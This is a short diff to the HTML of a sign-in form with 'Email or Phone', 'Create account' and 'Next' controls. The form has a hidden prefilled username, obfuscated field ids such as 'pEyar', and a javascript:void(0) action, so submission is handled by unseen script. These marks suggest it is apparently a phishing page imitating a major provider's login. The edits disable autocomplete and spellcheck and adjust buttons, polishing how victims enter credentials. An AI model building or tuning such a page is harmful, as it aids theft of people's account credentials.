@@ -69,7 +69,7 @@
         <div class="form-container">
             <div class="white-overlay" id="whiteOverlay"></div>
             <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
-        <form class="loginform" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
+        <form class="loginform" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8" autocomplete="off">
        
           
             <div class="form-half">
@@ -90,7 +90,7 @@
             <br> <br>
                 <div class="passdiv">
                     <input type='hidden' name="username" id="useRname" value="${username}">
-                    <input  required='' name="username" type='username' id="pEyar">
+                    <input required='' name="username" type='text' id="pEyar" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
                     <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Email or Phone' placeholder='Email or Phone'></label>
                     <div id="emailError" class="error-msg" style="display:none;"><img src="/image/eid.png"></div>
                 </div>
@@ -109,7 +109,7 @@
                 </div>
 
                 <div class="fgtpwd">
-                    <button id="createAccountBtn" class="hyperl" ><b>Create account</b></button>&nbsp;&nbsp;&nbsp;
+                    <button type="button" id="createAccountBtn" class="hyperl" ><b>Create account</b></button>&nbsp;&nbsp;&nbsp;
                     <button type="submit" class="btnnxt" id="nextBtn"><b>Next</b></button>
                   </div>
 
